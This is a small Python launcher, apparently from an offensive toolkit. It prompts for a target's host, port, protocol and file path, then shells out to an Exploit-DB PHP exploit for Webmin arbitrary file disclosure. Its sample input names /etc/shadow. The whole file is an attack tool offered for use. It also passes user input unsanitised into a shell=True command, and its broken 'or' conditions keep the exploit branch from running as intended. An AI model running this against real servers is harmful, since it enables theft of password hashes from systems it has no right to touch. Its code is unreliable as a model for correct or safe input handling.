import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


def exploit():
    while True:
        host = input(f"{Colors.red}(Webmin Arbitrary File Disclosure){Colors.end} [Enter HOST]:~#")
        port = int(input(f"{Colors.red}(Webmin Arbitrary File Disclosure){Colors.end} [Enter PORT]:~#"))
        http_https = input(f"{Colors.red}(Webmin Arbitrary File Disclosure){Colors.end} [HTTP OR HTTPS]:~#")
        rfile = input(f"{Colors.red}(Webmin Arbitrary File Disclosure){Colors.end} [Enter File]:~#")
        if host or port or http_https or rfile == "options":
            print("""
Enter Host: 0.0.0.0
Enter Port: 10000
Enter HTTP OR HTTPS: http
Enter File: /etc/shadow\n\n""")
        elif host or port or http_https or rfile == "back" or host or port or http_https or rfile == "exit":
            break
        else:
            sub.call(f"php /usr/share/exploitdb/exploits/multiple/remote/1997.php {host} {port} {http_https} {rfile}",
                     shell=True)
            break


exploit()
